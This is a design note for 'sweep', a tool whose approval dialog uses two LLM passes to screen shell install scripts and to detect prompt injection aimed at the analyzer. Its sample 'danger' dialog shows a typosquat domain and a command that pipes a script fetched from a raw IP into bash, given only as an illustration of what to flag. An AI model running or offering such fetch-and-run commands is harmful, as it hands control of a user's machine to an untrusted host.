---
name: llm-insights-dialog
description: First LLM-insights phase — the install approval dialog driven by LLM analysis. Design decisions and rationale from the interview; deleted at this feature's compaction step.
---

# LLM insights dialog

The install dialog promised by [[product-spec]] ("The install dialog" / "What sweep
catches"), built for its **first source: the LLM**. This phase turns today's
silent install path into an approval gate fed by LLM analysis. Everything
non-LLM (domain age, hash DBs, registry, diff-vs-prior) is a *later* source
plugged into the same frame.

## Why this is also the approval gate

Today `runInstall` (`installer/install.ts`) goes parse → fetch → save → analyze
→ **exec, unconditionally**. There is no approval step; step 5
(`maybeAnalyzeScript`) only prints one `sweep:` stderr line. This phase
introduces the gate the product spec assumes ("when the user approves, sweep
execs"). So "build the LLM insights dialog" and "introduce approval" are the
same work.

The dialog is therefore **load-bearing**: it must render on every interactive
install — including when there is no LLM and when analysis fails — because it
is the only thing standing between fetch and exec.

## The frame is multi-source from day one

The dialog is one component fed by **insight sources**. The LLM is the first and
only source wired this phase, but the frame, states, and section layout are
designed so the deterministic signals (domain age, hash lookups, registry,
changes-since-last-version) drop in later as additional sources without
reshaping the dialog. That is why the no-LLM state still shows a dialog (see
states below) rather than reverting to silent exec — the gate is universal;
only its *contents* depend on which sources are configured.

## Content layout (top → bottom)

1. **Header line** — severity pill (when present) + source (`host/path` of the
   install URL). No pill = clear; **there is no green "all clear" pill** (per
   product-spec: absence of red flags is not endorsement). The sample glyphs are
   normative — `✗` danger, `⚠` caution (and `⚠` is reused as the uniform flag
   marker and in the manipulation banner; the differing text/role disambiguates)
   — coloured from the theme's danger/warning tokens so the level reads at a
   glance. Whether that's the `Pill` primitive or plain coloured text, and the
   `nerdFonts` stance (the existing install prompt uses `nerdFonts: false`), are
   the implementer's.
2. **Compromise banner** — only in the manipulation-detected state; it takes the
   header's place *instead of* a severity pill (the analysis severity is
   untrusted there, so it is not shown as a pill).
3. **Verdict prose** — identity + character + *reasoning*. Says what the tool
   **is** (and who ships it) and the overall read; for suspicious scripts it
   carries the **narrative "why"** — the argument the terse flags summarize.
   **The prose never re-lists the behavior bullets.** Clean example: *"Ollama
   LLM runtime. Standard vendor installer from the official domain."* Suspicious
   example: *"Claims to install ollama but the domain is ollarna.com, and it
   hands control to a script on a raw IP. Treat with suspicion."*
4. **Flags** (only when present) — terse, concerning specifics, uniform `⚠`
   marker. No per-flag severity; the header pill conveys the overall level.
5. **Appears to do (not exhaustive)** — neutral, concrete actions as bullets,
   inline `(sudo)` where relevant. The "(not exhaustive)" framing is mandatory —
   sweep does not claim totality.
6. **Action bar** — `[Cancel] [Run]` (Cancel focused by default, always). On
   danger / manipulation, Run is replaced by a type-to-confirm input (below).

Flags and behaviors are **separate sections**, not one marked list. Overlap is
allowed — a flagged action may also appear as a behavior bullet.

## Severity & the "confirm, don't block" model

The analysis pass assigns one of three levels; the LLM decides, not a rule
engine (per product-spec, the LLM is what notices typosquats):

- **clear** — no pill. `[Cancel] [Run]`.
- **caution** — `⚠` pill. `[Cancel] [Run]`.
- **danger** — `✗` pill. Run is **not removed** — it becomes a type-to-confirm
  input: *"Type 'install' to run:"*. The literal confirm word is **`install`**
  (not the tool slug — simpler, no slug dependency), matched exactly (trimmed).
  In this state keystrokes go to the input (it holds focus); submitting the
  exact word runs; submitting anything else does nothing and stays in the dialog;
  Esc resolves the dialog as `cancelled`. The "focus defaults to Cancel" rule
  governs the *button* states (clear / caution / no-LLM / failed); danger's input
  is the necessary exception that takes focus to be typeable.

**There is no hard Block state.** This is a deliberate departure from
product-spec's "Block — no Run button" two-state design: an LLM false-positive
that *removes* the ability to run is too hostile for a probabilistic,
single-source judgment whose whole stance is "visibility, not verdicts — we
don't promise safety." Friction (typing `install`) replaces removal.
**product-spec's "The install dialog" section should be reconciled with this
when the feature lands** (its Allow/Block split, the Read-source button, and the
signal-panel `✓/◯` rows are superseded or deferred here).

Rationale for type-to-confirm over a double-press or focus-distance: it is the
most deliberate of the three (mirrors "type the repo name to delete"), and the
deliberation cost is paid only on danger.

## Two-pass analysis

Two LLM calls run **concurrently** against the same configured provider —
independent inputs, independent results, independent failures:

- **Analysis pass** → severity + verdict prose + flags + behaviors (contract
  below).
- **Manipulation pass** → "is this script trying to manipulate the
  reviewer/analyzer?" → clean | fired. Scripts piped into an LLM are an obvious
  injection vector; this is the two-pass injection defense from product-spec.

*(Implementation note: the llm layer's in-flight guard is per-conversation, so
"concurrent" means two separate conversations/handles, not two sends on one
conversation.)*

**The analysis output supersedes today's `summary`-only analysis** (the current
`analyze.ts` `{ summary }` schema + single-summary prompt). What the dialog
consumes: a **severity** of exactly `clear` / `caution` / `danger`; a **verdict**
prose string (identity + character + reasoning, per the layout); a list of
**flags** (concerning specifics); a list of **behaviors** ("appears to do").
Fixed chrome belongs to the **renderer, not the LLM**: the uniform `⚠` flag
marker, the "(not exhaustive)" label, the severity glyph/colour. Exact field
shapes — e.g. whether a behavior's `(sudo)` annotation is a structured field or
baked into the string — are the implementer's; what's fixed is that
root-requiring actions are visibly marked. The analysis prompt should carry a
rough severity rubric so the caution/danger line is intentional rather than
incidental: **danger** = active deception (typosquat), handing control to an
untrusted source (piping a remote/IP script to a shell), obfuscation; **caution**
= broad reach without deception (sudo, dotfile edits, system services);
**clear** = none of the above. Prompt voice follows "visibility, not verdicts":
it characterises provenance and behaviour (it may say something is a common or
official vendor installer) but **must never assert that anything is safe**.

**Trust rule:** render the verdict normally only if the manipulation pass came
back **provably clean** — the pass resolved and returned its clean result.
Anything else — it *fired*, or it *threw* (provider error, parse failure, abort,
timeout) — is not-clean and shows the verdict under a loud **"⚠ analysis may be
compromised"** banner. We drop the banner only on a positively clean result,
never on the mere absence of one. The (possibly poisoned) verdict is still shown
beneath the banner — *show-but-banner* over *suppress*, so the user keeps the
information and makes the call (suppressing gives them less to reason about while
still not blocking — strictly worse).

**Precedence.** The banner caveats a verdict. If there is no verdict to caveat
because the **analysis** pass itself failed, the analysis-failed state wins
(plain `[Run]`, no banner, no friction) and the manipulation result is moot — a
"may be compromised" banner over a "couldn't analyze" body is incoherent.

Manipulation-detected (verdict present) applies **danger-level Run friction**
(type `install`) regardless of the untrusted severity, since the whole verdict
is suspect. *(Reasoned default, not nailed down in the interview — revisit if it
feels wrong in practice.)*

## States summary

Focus defaults to Cancel in every state.

| State | Header | Body | Run |
|---|---|---|---|
| clear | source only | verdict + behaviors | `[Run]` |
| caution | `⚠ caution` | verdict + flags + behaviors | `[Run]` |
| danger | `✗ danger` | verdict + flags + behaviors | type `install` |
| manipulation | `⚠ analysis may be compromised` banner | verdict + flags + behaviors | type `install` |
| no-LLM | source only | *"No LLM provider configured — no analysis to show."* | `[Run]` |
| analysis-failed | source only | *"Couldn't analyze: &lt;reason&gt;."* | `[Run]` |

**analysis-failed is plain `[Run]`, no friction** — a provider outage is sweep's
failure, not the script's; don't punish the user for it. (Same affordance as the
no-LLM bare gate, with an error line instead of the "no provider" line.)

## Loading & the alt-screen session

One spinner **inside the dialog** ("Analyzing…") covers fetch + both passes; the
frame appears immediately. The dialog is a single alt-screen session that
transitions through states (spinner → verdict), so it needs a session-style
controller rather than the open-await-one-close shape the paste prompt uses today
(see "What this reshapes"). During loading only Cancel is live; cancelling
aborts the in-flight fetch + sends (see Outcomes).

- **Interactive mode** (`sweep` with no arg): the existing paste dialog
  **rerenders in place** into the spinner, then into the resolved insights state.
  One continuous alt-screen session — the paste dialog *becomes* the insights
  dialog. A pasted command that fails to **parse** surfaces inline in that
  session (return to the paste input with an error; let the user re-paste), not
  as a `sweep:` stderr line that would be hidden behind the live alt-screen (same
  reasoning as analysis-failed).
- **Direct mode** (`sweep "curl … | sh"`): the dialog appears with the spinner
  straight away — parse already happened on the argument, so a direct-mode parse
  failure keeps today's pre-dialog chrome + exit (no dialog is mounted yet).

## What this reshapes (not a drop-in at "step 5")

`architecture.md` still frames analysis as a stderr-only "step 5" with the dialog
"unbuilt." This phase changes the install orchestrator's shape — flag it for
whoever implements:

- Today `main` calls `promptInstallCommand` (which opens *and tears down* its own
  alt-screen) and *then* calls `runInstall`, a linear
  parse→fetch→save→analyze→exec function with no TUI awareness. A single
  alt-screen session spanning paste → fetch → analyze → approve cannot live
  inside that boundary.
- So fetch + analysis have to run *under* the live dialog session (the dialog
  drives them and rerenders spinner → verdict), the gate sits between fetch and
  exec *within* that session, and the alt-screen is torn down before `exec` (the
  child inherits the real terminal).
- This is intent, not a code prescription — how `main` / the orchestrator / the
  controller get reshaped is the implementer's. The point is only that it *is* a
  reshaping, not an insertion.

## Substrate this needs (not yet present)

- **An in-dialog spinner.** wrap-core's only spinner is the chrome/stderr one,
  which paints the normal buffer — useless inside an alt-screen dialog. `@inkjs/ui`
  (already a peer dep) ships a `Spinner` usable inside Ink content; whether to
  surface a themed spinner through wrap-core's tui barrel (mirroring how shared
  primitives live in wrap-core) or use the raw component is the implementer's.
  Either way it is net-new — the loading state is not free.
- **A two-pass test contract.** `SWEEP_TEST_RESPONSES` today feeds one provider,
  and the test-provider plays responses in call order (two separate providers
  each restart at index 0), so a single flat list cannot deterministically
  address "the analysis pass" vs "the manipulation pass." Exercising the state
  matrix (clean+clean, danger+clean, any+fired, any/both-errored) needs the
  sweep-side env contract extended to address the two passes. The core mechanism
  exists; the sweep contract over it must grow.

## Outcomes (the invocation log)

The `invocations` table is sweep's log of *every run* — ran, errored, or not run
at all. These are **run outcomes**, a different thing from a package's lifecycle
**state** (see below). This phase only writes the log; it does not decide state.

- **Cancel / decline** → the **`cancelled`** invocation outcome (already in the
  `Outcome` union — and in product-spec's "ran, cancelled, errored" and
  conventions.md; no code path produces it yet, and the free-text column means no
  migration). Preserves invariant 3 (one invocation row per run). Exit code:
  non-zero and outside the *fixed* parse(2)/fetch(1) codes; exec passes arbitrary
  codes through, so collision with *those* can't be avoided and isn't worth
  chasing — exact value is the implementer's.
- **Cancel applies at any point the dialog is up, including during the spinner.**
  Cancelling mid-analysis aborts the in-flight fetch + LLM sends (the llm layer
  takes an `AbortSignal`) and records one `cancelled` row. If the cancel lands
  before fetch completed there is no sha/package yet — record the row with the
  same null-field shape the fetch-failure path already uses.
- **Run** → exec as today; outcome `ran` / `errored`.

**Package "state" is a separate concern, deferred.** A package row materializes
at fetch success, *before* the gate, at status `attempting`; a cancelled run
never reaches exec, so what status that row should rest at is an open lifecycle
question — the package's *state*, not the run's *outcome*. This phase does **not**
settle it: do not add a cancel transition to `lifecycle.md`, and do not change
how `sweep list` displays anything. Just log the `cancelled` run. State is
decided when the lifecycle work is taken up.

## Invariant nuance (for the vault)

Invariant 2 was *just* amended (commit `032ef44`, "Amend invariant 2 for
never-throws steps") to mandate that the analysis step "formats and prints its
own `sweep:` line and swallows the error instead of throwing." This phase
**reverses that mechanism**: now that analysis feeds the approval dialog, a
failure surfaces **in the dialog** (the analysis-failed state), not on stderr —
a `sweep:` line would be hidden behind the alt-screen. Analysis still never
throws and never fails the install path; only the failure *channel* changes.
Because this overturns a two-day-old, deliberate decision, **invariant 2 needs a
real rewrite, not a wording nudge** when this lands.

## Out of scope (this phase)

Deliberately deferred — do **not** build these now:

- **Provider config + first-run wizard.** Assume `~/.sweep/config.jsonc` already
  defines a provider (this is build-order step 1 in [[script-inspection]],
  tracked separately; mirror wrap's config-wizard pattern when it's built). The
  dialog is exercised via the test provider (`SWEEP_TEST_RESPONSES`) or an
  already-configured one. (Config-reading is still a stub today — `ensureConfig()`
  returns `{}` — so the **no-LLM state** is only reachable via a test seam this
  phase; its real trigger waits on the provider-config track.)
- **`--auto` and non-TTY policy.** Assume an interactive TTY. The
  block-threshold-for-headless question is moot until `--auto` returns.
- **Read source / source viewer.** No button this phase. (Annotated/highlighted
  viewer is a noted future idea in product-spec; reading-before-running is *a*
  future feature, not sweep's core pitch.)
- **Analysis caching/persistence.** Recompute both passes every run; no new DB
  storage this phase. sha-keyed caching is already decided in
  [[script-inspection]] but waits for a place to store it.
- **All non-LLM insight sources** — domain age, hash/sigstore lookups, registry
  signals, diff-vs-prior changes panel. The frame is built to host them; none
  are wired now.
- **Install-location resolution** ([[script-inspection]]'s candidate-paths +
  `lstat`). Not displayed. The implementer may still collect candidate paths in
  the analysis output to avoid reshaping the schema later, but resolution is out
  of scope.
- **Package lifecycle "state" after a cancel** (and any `sweep list` display of
  it). This phase logs the `cancelled` run outcome only; what status a package
  rests at after a declined run is a lifecycle-work decision, not this phase's.

## Sample dialogs

Clean (clear):

```
┌─ sweep ──────────────────────────────────────────────┐
│  ollama.com/install.sh                                │
│                                                       │
│  Ollama LLM runtime. Standard vendor installer from   │
│  the official domain.                                 │
│                                                       │
│  Appears to do (not exhaustive):                      │
│   • Download ollama binary from ollama.com            │
│   • Install to /usr/local/bin/ollama  (sudo)          │
│   • Create + enable a systemd service (sudo)          │
│   • Add an 'ollama' system user                       │
│                                                       │
│  [ Cancel ]   [ Run ]                                 │
└───────────────────────────────────────────────────────┘
```

Suspicious (danger):

```
┌─ sweep ──────────────────────────────────────────────┐
│  ✗ danger        ollarna.com/install.sh               │
│                                                       │
│  Claims to install "ollama" but the domain is         │
│  ollarna.com, not ollama.com, and it hands control    │
│  to a script on a raw IP. Treat with suspicion.       │
│                                                       │
│  Flags:                                               │
│   ⚠ Domain ollarna.com mimics ollama.com              │
│   ⚠ Downloads + runs a script from 193.43.x.x         │
│   ⚠ Appends export lines to ~/.bashrc                 │
│                                                       │
│  Appears to do (not exhaustive):                      │
│   • curl http://193.43.x.x/x.sh | bash                │
│   • echo 'export PATH=…' >> ~/.bashrc                 │
│                                                       │
│  [ Cancel ]   Type 'install' to run: ____             │
└───────────────────────────────────────────────────────┘
```

No-LLM bare:

```
┌─ sweep ──────────────────────────────────────────────┐
│  ollama.com/install.sh                                │
│                                                       │
│  No LLM provider configured — no analysis to show.    │
│                                                       │
│  [ Cancel ]   [ Run ]                                 │
└───────────────────────────────────────────────────────┘
```

Loading:

```
┌─ sweep ──────────────────────────────────────────────┐
│  ollama.com/install.sh                                │
│                                                       │
│  ⠋ Analyzing…                                         │
│                                                       │
│  [ Cancel ]                                           │
└───────────────────────────────────────────────────────┘
```
